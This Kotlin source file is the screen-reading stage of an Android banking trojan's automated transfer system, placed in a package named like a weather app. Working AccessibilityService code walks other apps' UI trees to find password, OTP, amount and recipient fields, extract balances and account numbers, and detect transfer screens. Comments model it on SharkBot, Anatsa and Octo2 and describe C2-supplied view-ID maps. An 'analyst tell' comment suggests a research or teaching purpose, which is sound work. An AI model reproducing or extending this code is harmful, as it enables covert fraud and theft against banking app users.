package com.skyweather.forecast.core

import android.view.accessibility.AccessibilityNodeInfo

/**
 * UI tree traversal — reads the visible screen via AccessibilityService.
 *
 * ══════════════════════════════════════════════════════════════════
 * STAGE 4 — ATS Screen Reader
 * ══════════════════════════════════════════════════════════════════
 *
 * AccessibilityService.getRootInActiveWindow() returns the root
 * AccessibilityNodeInfo of the foreground app's view hierarchy.
 * Walk this tree depth-first → extract all visible text + find
 * specific UI elements by view ID pattern or text content.
 *
 * This is the ATS engine's "eyes" — before injecting gestures,
 * the engine must SEE what's on screen.
 *
 * Real-world references:
 *   SharkBot ATS: reads balance from specific banking app view IDs
 *   Anatsa: reads screen text to determine navigation state (which
 *     banking screen the user is on: login / dashboard / transfer / OTP)
 *   Octo2: full screen-reading for remote operator display mirroring
 *
 * Analyst tell: AccessibilityService calling getRootInActiveWindow()
 * + recursive getChild() traversal from a non-foreground package =
 * high-confidence banker screen-reading.
 * ══════════════════════════════════════════════════════════════════
 */
object ScreenReader {

    /**
     * Find a node by view ID resource name pattern.
     *
     * View IDs follow format: "com.example.bank:id/passwordField"
     * Pattern matching allows partial match on the ID portion.
     *
     * Real SharkBot: maintains per-bank view-ID maps from C2 config.
     * Operator reverse-engineers target banking app, records view IDs
     * for amount_field, recipient_field, confirm_button, otp_field.
     * C2 pushes these IDs paired with ATS command sequences.
     *
     * @param root Root node from getRootInActiveWindow()
     * @param idPattern Substring to match in viewIdResourceName
     * @return First matching node, or null. Caller MUST recycle.
     */
    fun findNodeById(root: AccessibilityNodeInfo?, idPattern: String): AccessibilityNodeInfo? {
        if (root == null) return null

        val id = root.viewIdResourceName
        if (id != null && id.contains(idPattern, ignoreCase = true)) {
            return root
        }

        for (i in 0 until root.childCount) {
            val child = root.getChild(i) ?: continue
            val found = findNodeById(child, idPattern)
            if (found != null) {
                if (found !== child) child.recycle()
                return found
            }
            child.recycle()
        }

        return null
    }

    /**
     * Find a node whose text content contains the given string.
     *
     * Used for screen-state detection: "Transfer", "Confirm",
     * "Enter your PIN", "Verification code", etc.
     *
     * Real Anatsa: C2 config includes per-bank screen-identifier strings
     * in the user's language. "Transferência" (PT), "Überweisen" (DE).
     *
     * @param root Root node from getRootInActiveWindow()
     * @param textPattern Substring to match in node text
     * @return First matching node, or null. Caller MUST recycle.
     */
    fun findNodeByText(root: AccessibilityNodeInfo?, textPattern: String): AccessibilityNodeInfo? {
        if (root == null) return null

        val text = root.text?.toString()
        if (text != null && text.contains(textPattern, ignoreCase = true)) {
            return root
        }

        // Also check contentDescription (buttons often use this instead of text)
        val desc = root.contentDescription?.toString()
        if (desc != null && desc.contains(textPattern, ignoreCase = true)) {
            return root
        }

        for (i in 0 until root.childCount) {
            val child = root.getChild(i) ?: continue
            val found = findNodeByText(child, textPattern)
            if (found != null) {
                if (found !== child) child.recycle()
                return found
            }
            child.recycle()
        }

        return null
    }

    /**
     * Find all clickable nodes — buttons, links, toggles.
     *
     * Used to enumerate actionable elements on current screen.
     * ATS engine compares against expected button set for current
     * banking app screen state.
     *
     * @param root Root node
     * @return List of clickable nodes. Caller MUST recycle each.
     */
    fun findClickableNodes(root: AccessibilityNodeInfo?): List<AccessibilityNodeInfo> {
        val results = mutableListOf<AccessibilityNodeInfo>()
        collectClickable(root, results)
        return results
    }

    private fun collectClickable(node: AccessibilityNodeInfo?, out: MutableList<AccessibilityNodeInfo>) {
        if (node == null) return

        if (node.isClickable) {
            out.add(AccessibilityNodeInfo.obtain(node))
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            collectClickable(child, out)
            child.recycle()
        }
    }

    /**
     * Extract ALL visible text from the current screen.
     *
     * Returns a list of (viewId, text) pairs for every text-bearing node.
     * ATS engine uses this for:
     *   1. Screen-state identification (is this the transfer page?)
     *   2. Balance extraction (find the number near "Available balance")
     *   3. Account number reading (IBAN/routing visible on dashboard)
     *   4. Error detection ("Insufficient funds", "Session expired")
     *
     * Real SharkBot: streams full screen text to C2 operator panel.
     * Operator reads victim's banking app in real-time.
     */
    fun extractAllText(root: AccessibilityNodeInfo?): List<TextNode> {
        val results = mutableListOf<TextNode>()
        collectText(root, results, depth = 0)
        return results
    }

    private fun collectText(node: AccessibilityNodeInfo?, out: MutableList<TextNode>, depth: Int) {
        if (node == null || depth > 20) return // Depth guard — prevent infinite recursion

        val text = node.text?.toString()
        val desc = node.contentDescription?.toString()
        val id = node.viewIdResourceName ?: ""

        if (!text.isNullOrBlank() || !desc.isNullOrBlank()) {
            out.add(TextNode(
                viewId = id,
                text = text ?: "",
                description = desc ?: "",
                isEditable = node.isEditable,
                isClickable = node.isClickable,
                className = node.className?.toString() ?: ""
            ))
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            collectText(child, out, depth + 1)
            child.recycle()
        }
    }

    /**
     * Check if current screen matches a pattern — screen-state detection.
     *
     * ATS commands include "wait_screen" with text patterns.
     * Engine calls this to confirm the expected banking app screen
     * is visible before proceeding with the next action.
     *
     * Example patterns:
     *   "Transfer"      → transfer initiation screen
     *   "Confirm"       → confirmation screen
     *   "code"          → OTP entry screen
     *   "Successful"    → completion screen
     *
     * @param root Root node
     * @param patterns List of text patterns — ANY match = screen matches
     * @return true if any pattern found in visible text
     */
    fun screenContainsAny(root: AccessibilityNodeInfo?, patterns: List<String>): Boolean {
        if (root == null || patterns.isEmpty()) return false
        val allText = extractAllText(root)
        val combined = allText.joinToString(" ") { "${it.text} ${it.description}" }.lowercase()
        return patterns.any { combined.contains(it.lowercase()) }
    }

    /**
     * Find editable text fields — input targets for ACTION_SET_TEXT.
     *
     * @param root Root node
     * @return List of editable nodes. Caller MUST recycle each.
     */
    fun findEditableNodes(root: AccessibilityNodeInfo?): List<AccessibilityNodeInfo> {
        val results = mutableListOf<AccessibilityNodeInfo>()
        collectEditable(root, results)
        return results
    }

    private fun collectEditable(node: AccessibilityNodeInfo?, out: MutableList<AccessibilityNodeInfo>) {
        if (node == null) return

        if (node.isEditable) {
            out.add(AccessibilityNodeInfo.obtain(node))
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            collectEditable(child, out)
            child.recycle()
        }
    }

    data class TextNode(
        val viewId: String,
        val text: String,
        val description: String,
        val isEditable: Boolean,
        val isClickable: Boolean,
        val className: String
    )
}
